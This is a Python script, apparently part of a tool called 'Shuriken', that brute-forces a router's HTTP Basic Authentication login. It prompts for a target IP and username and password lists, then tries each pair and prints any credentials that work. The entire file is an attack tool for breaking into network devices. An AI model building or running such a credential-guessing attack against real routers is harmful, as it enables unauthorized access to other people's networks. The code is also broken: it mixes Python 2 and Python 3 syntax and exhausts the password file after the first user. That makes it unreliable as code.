import urllib2 as ur
import http.client
import sys

def get_realm(ip):
    realm_router = ""
    try:
        conn = http.client.HTTPConnection(ip)
        conn.request("GET", "/")
        res = conn.getresponse()
        realm_router = res.getheader("WWW-Authenticate")
        realm_router = realm_router.split("=")[1].strip("\"")
        return realm_router
    except Exception as e:
        print(e)
        sys.exit(0)

def attack(ip, users, paswords):
    find = False
    realm_router = get_realm(ip)

    for u in users:
        u2 = u.strip()
        for p in paswords:
            p2 = p.strip()
            try:
                auth_handler = ur.HTTPBasicAuthHandler()
                auth_handler.add_password(realm=realm_router,
                                          uri=ip,
                                          user=u2,
                                          passwd=p2)
                opener = ur.build_opener(auth_handler)
                ur.install_opener(opener)
                pag = ur.urlopen("http://" + str(ip))
                if(pag.getcode() == 200):
                    print(chr(27) + "[1;34m[+]" + chr(27)
                          + "0m Login found: " + str(u2) + ":" + str(p2))
                    find = True
            except:
                print(chr(27) + "[1;31m[-]" + chr(27)
                      + "0m : " + str(u2) + ":" + str(p2) + " >> Failed !!")

    if not find:
        print ("Login not found")

def init_BruteForceRouert():
    ip = input("[$ Shuriken $] Insert target IP > ")
    path = "BruteForceRouter/"
    try:
        users = input("[$ Shuriken $] Insert forlder with users list > ")
        users = path + users
        users = open(users, "r")
        paswords = input("[$ Shuriken $] Insert forlder with paswords list > ")
        paswords = path + paswords
        paswords = open(paswords, "r")
    except Exception as e:
        print "Error duranet la lectura: "
        print(e)
        sys.exit(0)
    attack(ip, users, paswords)